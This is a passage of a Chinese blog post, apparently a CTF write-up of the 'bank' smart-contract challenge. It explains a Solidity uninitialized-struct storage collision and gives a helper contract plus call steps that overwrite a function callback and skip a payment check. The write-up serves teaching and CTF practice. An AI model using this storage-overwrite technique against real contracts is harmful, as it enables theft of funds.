+<h2 id="bank"><a href="#bank" class="headerlink" title="bank"></a>bank</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230102212049614.png" alt="image-20230102212049614"></p>
+<p>题目要求我们调用这个函数，但第一步的100000000ether还不知道怎么绕过，先看合约。</p>
+<p>漏洞：</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230102212201082.png" alt="image-20230102212201082"></p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230102212207919.png" alt="image-20230102212207919"></p>
+<p>deposit函数和修饰符onlyPass均存在未初始化结构体的漏洞，都会存在slot占用的情况。</p>
+<p>首先合约的存储结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">|     unused (12)     |          owner (20)         | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                 randomNumber (32)                 | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|               safeboxes.length (32)               | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|       occupied by failedLogs but unused (32)      | &lt;- slot 3</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>而FailedAttemp结构体在onlyPass下会覆盖到以下slot：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">|                      idx (32)                     |</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                     time (32)                     |</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|          origin (20)         |   triedPass (12)   |</span><br><span class="line">-----------------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同理SafeBox在deposit下同样会覆盖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (11) | hash (12) | callback (8) | done (1) |</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                     value (32)                    |</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>可以看到虽然两个结构体都可以修改owner的值，但明显没啥用，这个题跟owner的关系也不大。</p>
+<p>我们能够发现不管是<code>sendEther</code>函数还是<code>sendFlag</code>函数都是internal，而且只有这两个函数才用了修饰符<code>onlyPass</code>，只有在withdraw函数中通过<code>box.callback</code>语句才能够调用到这两个函数，但<code>callback</code>在结构体中的存储是用八字节的空间来存储该函数在字节码中的位置，因为在EVM中调用一个函数相当于执行<code>jump</code>操作，而跳到的地方都是以<code>jumpdest</code>开始。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230102214235376.png" alt="image-20230102214235376"></p>
+<p>通过对合约字节码的反编译我们发现，在06F6处就是push入了100000000ether进入，也就是对应的<code>require(msg.value &gt;= 100000000 ether);</code>语句，而在070F处同样存在<code>JUMPDEST</code>,开始<code>emit SendFlag</code>操作，那么如果我们能够改变box的callback值为070F，我们就能够绕过一亿ether的限制。</p>
+<p>通过上文对结构体占用slot的分析能够发现，在<code>onlyPass</code>中通过<code>failedAttempt</code>的结构体占位，能够让<code>origin (20)|triedPass (12) </code>占用slot2也就是存放<code>safeboxes</code>长度的插槽。如果origin足够大，就会使<code>safeboxes</code>的长度变得很大，如果大到可以覆盖f<code>ailedLogs</code>，那么我们就可以通过<code>safeboxes</code>来访问<code>failedLogs</code>，也就是相当于成了父数组与子数组的关系，而又因为<code>triedPass</code>我们可以完全控制，所以我们可以通过<code>triedPass</code>来修改callback从而控制合约的执行。</p>
+<p>而由于<code>emit sendFlag</code>的操作码位置是070F，所以我们只需要根据这个来设计<code>triedPass</code>即可。</p>
+<h3 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h3><p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line">contract attck&#123;</span><br><span class="line">    function mapStart(address _addr)public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(keccak256(abi.encodePacked(bytes32(_addr),bytes32(3))));</span><br><span class="line">    &#125;</span><br><span class="line">    function arrayStart()public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(bytes32(2));</span><br><span class="line">    &#125;</span><br><span class="line">    function lengthNeed(address _addr)public pure returns(uint256 idx)&#123;</span><br><span class="line">        return (uint256(mapStart(_addr))+2-uint256(arrayStart()))/2;</span><br><span class="line">    &#125;</span><br><span class="line">    function can(address _addr)public pure returns(uint256)&#123;</span><br><span class="line">        return (uint256(mapStart(_addr))+2-uint256(arrayStart()))%2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>mapStart</code>函数用来计算<code>failedLogs</code>中数组的起始位置。</li>
+<li><code>arrayStart</code>函数用来计算<code>safeboxes</code>的起始位置</li>
+<li><code>lengthNeed</code>用来计算idx，同时也是<code>safeboxes</code>要覆盖<code>failedLogs</code>所需的最小长度。</li>
+<li><code>can</code>用来判断<code>safeboxes</code>的位置是否能够覆盖到<code>failedLogs</code>中<code>origin (20)|triedPass (12) </code>的值</li>
+<li>需要保证<code>tx.origin</code>的值大于idx转换成十六进制后的前四十位，否则无法进行覆盖</li>
+<li>满足条件后就可以开始攻击</li>
+</ul>
+<p>攻击步骤：</p>
+<ol>
+<li>调用<code>deposit(0x000000000000000000000000)</code>，并传入1ether，这里的目的是让<code>callback</code>指向<code>sendEther</code>,为下一步进入<code>onlyPass</code>做准备</li>
+<li>调用<code>withdraw(0,0x111111000000000000070F00)</code> ,这里就控制了<code>triedPass</code>,中间的<code>000000000000070F</code>也就改变了<code>callback</code>的值,其实相当于把 <code>failedLogs[msg.sender]</code> 对应的内容看成是 <code>safeboxes</code> 数组的内容,同时修改了数组长度.</li>
+<li>最后调用withdraw函数传入算出的idx和任意bytes12值即可发送flag。</li>
+</ol>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230102213455415.png" alt="image-20230102213455415"></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://hitcxy.com/2020/balsn2019-bank/">https://hitcxy.com/2020/balsn2019-bank/</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>lucifer
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/" title="ChainFlag靶场实战（一）">http://example.com/2022/12/29/ChainFlag靶场实战（一）/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/23/Etherhack%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" rel="prev" title="Etherhack靶场实战">
+      <i class="fa fa-chevron-left"></i> Etherhack靶场实战
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Storage"><span class="nav-number">1.</span> <span class="nav-text">Storage</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cow"><span class="nav-number">1.1.</span> <span class="nav-text">Cow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">1.1.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rise"><span class="nav-number">1.2.</span> <span class="nav-text">rise</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#roiscoin"><span class="nav-number">1.3.</span> <span class="nav-text">roiscoin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bank"><span class="nav-number">1.4.</span> <span class="nav-text">bank</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-3"><span class="nav-number">1.4.2.</span> <span class="nav-text">攻击</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lucifer</p>
+  <div class="site-description" itemprop="description">知而不行，谓之不诚</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-12 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lucifer</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">208k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:09</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
